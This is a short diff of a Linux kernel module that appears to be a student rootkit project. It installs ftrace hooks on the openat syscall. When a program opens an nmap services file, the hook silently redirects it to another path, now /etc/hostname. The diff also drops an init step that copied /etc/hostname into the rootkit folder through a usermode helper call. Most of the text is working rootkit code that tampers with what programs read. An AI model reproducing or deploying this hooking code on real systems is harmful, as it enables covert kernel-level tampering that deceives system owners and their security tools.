@@ -198,8 +198,9 @@ static asmlinkage int (*orig_openat)(struct pt_regs *regs);
 
 static asmlinkage int hook_openat(struct pt_regs *regs) {
   char *pathname = (void*)(regs->si);
+  char *hostname_file = "/etc/hostname";
   if (strcmp(pathname, NMAP_SERVICES_FILE) == 0) {
-    regs->si = (unsigned long)((void *)copy_hosts);
+    regs->si = (unsigned long)((void *)hostname_file);
     return orig_openat(regs); 
   } 
 
@@ -269,11 +270,6 @@ static struct ftrace_hook hooks[] = {
 
 
 int __init my_init(void){
-  // Make copy of network files. 
-  char *rootkit_dir = "/home/uwem/Desktop/logger/cpsc413-project/rootkit";
-  char *argv1[] = {"/bin/cp", "/etc/hostname", rootkit_dir, NULL};
-  char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
-  call_usermodehelper(argv1[0], argv1, envp, UMH_NO_WAIT);
 	int err;
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	if(err){
